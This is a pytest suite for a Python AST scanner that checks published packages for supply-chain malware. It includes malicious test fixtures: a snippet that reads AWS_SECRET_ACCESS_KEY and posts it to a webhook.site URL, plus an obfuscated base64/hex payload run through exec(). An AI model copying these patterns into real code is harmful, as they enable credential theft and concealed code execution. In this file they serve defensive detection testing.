"""False-positive prevention and edge case tests for native Python AST security scanner."""

from pathlib import Path

from app.analysis.analyzer import analyze_package
from app.analysis.js_scanner import Signal
from app.analysis.models import FindingConfidence, GapReason, Severity
from app.analysis.py_scanner import scan_python
from app.comparison.compare import compare_inventories
from tests.test_comparison import inventory, make_metadata, matched


def test_benign_fastapi_web_server() -> None:
    """Standard FastAPI web application configuration should not trigger high/critical alerts."""
    code = """
import os
from typing import Dict, Any

HOST = os.getenv("HOST", "0.0.0.0")
PORT = int(os.getenv("PORT", "8000"))
DEBUG = os.getenv("DEBUG", "false").lower() == "true"

class AppConfig:
    def __init__(self, host: str, port: int, debug: bool):
        self.host = host
        self.port = port
        self.debug = debug

def create_app() -> Dict[str, Any]:
    config = AppConfig(HOST, PORT, DEBUG)
    return {"host": config.host, "port": config.port, "status": "initialized"}
"""
    result = scan_python(code)
    assert not result.has_parse_errors
    # All findings should be at most INFO severity (ENV-001 for non-credential env vars)
    assert all(hit.severity == Severity.INFO for hit in result.hits)
    assert not any(hit.signal == Signal.CREDENTIAL for hit in result.hits)


def test_benign_cli_tool_argparse() -> None:
    """Benign CLI application using argparse and standard filesystem paths."""
    code = """
import argparse
import sys
from pathlib import Path

def parse_args():
    parser = argparse.ArgumentParser(description="Process data files.")
    parser.add_argument("--input", type=str, required=True, help="Input data file")
    parser.add_argument("--output", type=str, default="out.txt", help="Output file")
    return parser.parse_args()

def main():
    args = parse_args()
    input_path = Path(args.input)
    if not input_path.exists():
        sys.exit(1)
    
    with open("results.log", "w") as f:
        f.write("Completed successfully\\n")

if __name__ == "__main__":
    main()
"""
    result = scan_python(code)
    assert not result.has_parse_errors
    # Writing to a standard results.log file is not a startup or credential path
    assert not any(hit.rule_id == "FS-002" for hit in result.hits)
    assert not any(hit.severity in (Severity.HIGH, Severity.CRITICAL) for hit in result.hits)


def test_benign_subprocess_safe_invocations() -> None:
    """Fixed-argument subprocess calls for tools like git or python version checks."""
    code = """
import subprocess

def get_git_revision() -> str:
    try:
        out = subprocess.check_output(["git", "rev-parse", "HEAD"])
        return out.strip().decode("utf-8")
    except Exception:
        return "unknown"

def check_python_version() -> bool:
    res = subprocess.run(["python3", "--version"], capture_output=True)
    return res.returncode == 0
"""
    result = scan_python(code)
    assert not result.has_parse_errors
    # Subprocess import is INFO, fixed commands are LOW severity
    rule_ids = {h.rule_id for h in result.hits}
    assert "PROC-001" in rule_ids
    assert "PROC-002" in rule_ids
    assert not any(h.severity in (Severity.HIGH, Severity.CRITICAL) for h in result.hits)


def test_benign_dynamic_import_fixed_modules() -> None:
    """Fixed static module names with importlib and __import__ should not trigger alerts."""
    code = """
import importlib

json_mod = importlib.import_module("json")
yaml_mod = importlib.import_module("yaml")
sys_mod = __import__("sys")
"""
    result = scan_python(code)
    assert not result.has_parse_errors
    # Fixed imports are safe and should not trigger EXEC-004 or EXEC-005
    assert not any(h.rule_id in ("EXEC-004", "EXEC-005") for h in result.hits)


def test_malformed_syntax_edge_cases() -> None:
    """Malformed Python code and invalid byte encodings must be handled safely."""
    # 1. Unclosed parenthesis
    res1 = scan_python("def calculate(x, y:\n    return x + y")
    assert res1.has_parse_errors is True
    assert len(res1.hits) == 0

    # 2. Indentation error
    res2 = scan_python("def compute():\nreturn 42\n")
    assert res2.has_parse_errors is True
    assert len(res2.hits) == 0

    # 3. Source with null bytes in string
    res3 = scan_python(b"def func():\n    pass\x00\x00")
    assert isinstance(res3.has_parse_errors, bool)

    # 4. Empty string
    res4 = scan_python("")
    assert res4.has_parse_errors is False
    assert len(res4.hits) == 0


def test_deeply_nested_ast_resilience() -> None:
    """Deeply nested AST expressions must not crash with recursion or memory errors."""
    nested = "1"
    for _ in range(120):
        nested = f"({nested} + 1)"
    code = f"x = {nested}\n"
    res = scan_python(code)
    assert isinstance(res.has_parse_errors, bool)


def test_double_encoded_payload_execution() -> None:
    """Double decoding (e.g., base64 decode followed by unhexlify) executed dynamically."""
    code = """
import base64
import binascii

step1 = base64.b64decode('NzA3MjY5NmU3NDI4MjcyOTI5')
step2 = binascii.unhexlify(step1)
exec(step2)
"""
    result = scan_python(code)
    assert not result.has_parse_errors
    rule_ids = {h.rule_id for h in result.hits}
    assert "OBF-004" in rule_ids
    assert "EXEC-003" in rule_ids
    exec_hit = next(h for h in result.hits if h.rule_id == "EXEC-003")
    assert exec_hit.severity == Severity.CRITICAL
    assert exec_hit.confidence == FindingConfidence.HIGH
    assert exec_hit.signal == Signal.EXECUTION


def test_differential_scanning_separates_source_from_introduced(tmp_path: Path) -> None:
    """Differential analysis between source repo and published package.

    Verifies that pre-existing safe behavior in repository source does not
    falsely alert as newly introduced, while genuinely introduced attacks do.
    """
    source_files = {
        "client.py": (
            "import os\n"
            "import requests\n"
            "host = os.getenv('HOST', 'localhost')\n"
            "resp = requests.get('https://example.com/api')\n"
        )
    }
    pkg_files = {
        "client.py": (
            "import os\n"
            "import requests\n"
            "host = os.getenv('HOST', 'localhost')\n"
            "resp = requests.get('https://example.com/api')\n"
            "key = os.environ['AWS_SECRET_ACCESS_KEY']\n"
            "requests.post('https://webhook.site/malicious', json={'key': key})\n"
        )
    }

    src_inv = inventory(tmp_path, "src_repo", source_files)
    pkg_inv = inventory(tmp_path, "pkg_dist", pkg_files)
    meta = make_metadata()

    # Compare inventories using standard comparison engine
    report = compare_inventories(meta, matched(), pkg_inv, src_inv, None)

    analysis = analyze_package(meta, pkg_inv, report, src_inv)
    assert analysis.files_scanned == 1

    rule_ids = {f.rule_id for f in analysis.findings}
    # Newly introduced secret access and webhook call
    assert "ENV-002" in rule_ids
    assert "NET-002" in rule_ids
    assert "CORR-001" in rule_ids

    corr_finding = next(f for f in analysis.findings if f.rule_id == "CORR-001")
    assert corr_finding.severity == Severity.CRITICAL
    assert corr_finding.path == "client.py"


def test_unsupported_language_gaps_preserved_for_non_python_scripts(tmp_path: Path) -> None:
    """Non-scannable languages like .sh, .bash continue producing UNSUPPORTED_LANGUAGE gaps."""
    files = {
        "install.sh": "#!/bin/bash\necho installing\n",
        "setup.ps1": "Write-Output 'PowerShell'\n",
        "main.py": "def main(): pass\n",
    }
    pkg_inv = inventory(tmp_path, "pkg_mixed", files)
    meta = make_metadata()

    analysis = analyze_package(meta, pkg_inv, None, None)
    # Python file is scanned
    assert analysis.files_scanned == 1

    # .sh and .ps1 are recorded as UNSUPPORTED_LANGUAGE gaps
    gap_paths = {g.path: g.reason for g in analysis.gaps}
    assert gap_paths.get("install.sh") == GapReason.UNSUPPORTED_LANGUAGE
    assert gap_paths.get("setup.ps1") == GapReason.UNSUPPORTED_LANGUAGE
    # main.py does not have an UNSUPPORTED_LANGUAGE gap
    assert "main.py" not in gap_paths


def test_benign_urllib_requests_no_exfil_destination() -> None:
    """Standard API requests to known public services produce only INFO findings."""
    code = """
import urllib.request
import json

def fetch_package_info(pkg_name: str) -> dict:
    url = f"https://pypi.org/pypi/{pkg_name}/json"
    with urllib.request.urlopen(url) as resp:
        return json.loads(resp.read().decode("utf-8"))
"""
    result = scan_python(code)
    assert not result.has_parse_errors
    # Should only produce NET-001 (INFO), not NET-002 (HIGH)
    rule_ids = {h.rule_id for h in result.hits}
    assert "NET-001" in rule_ids
    assert "NET-002" not in rule_ids
    assert not any(
        h.severity in (Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL) for h in result.hits
    )


def test_obfuscated_hex_and_character_code_strings() -> None:
    """Detect character code joins and high-entropy base64/hex strings."""
    # 1. Chr list comprehension join
    code_chr = "payload = ''.join([chr(c) for c in [101, 118, 97, 108]])\n"
    res1 = scan_python(code_chr)
    assert any(h.rule_id == "OBF-003" and h.signal == Signal.DECODE for h in res1.hits)

    # 2. Long high-entropy base64 string (200+ chars)
    raw_payload = b"A" * 50 + b"B" * 50 + b"C" * 50 + bytes(range(100))
    import base64

    high_entropy_b64 = base64.b64encode(raw_payload).decode("ascii")
    code_b64 = f'encoded_blob = "{high_entropy_b64}"\n'
    res2 = scan_python(code_b64)
    assert any(h.rule_id == "OBF-002" and h.signal == Signal.OBFUSCATION for h in res2.hits)
